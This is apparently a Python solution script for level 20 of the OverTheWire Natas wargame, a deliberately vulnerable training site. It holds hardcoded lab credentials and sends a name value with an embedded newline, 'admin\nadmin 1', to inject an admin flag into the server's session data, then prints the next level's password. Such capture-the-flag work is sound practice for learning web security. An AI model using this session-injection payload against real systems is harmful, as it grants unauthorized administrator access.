import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    auth = HTTPBasicAuth('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')
    cook = {'PHPSESSID':'tald'}
    param = {'submit':'Change name', 'name':'admin\nadmin 1', }
    requests.get('http://natas20.natas.labs.overthewire.org/', auth=auth, cookies=cook, params=param)
    r = requests.get('http://natas20.natas.labs.overthewire.org/', auth=auth, cookies=cook, params=param)
#   print(r.text)
    print(r.text[r.text.find('Password: ')+10:r.text.find('Password: ')+42])
if __name__ == '__main__':
    get_pass()
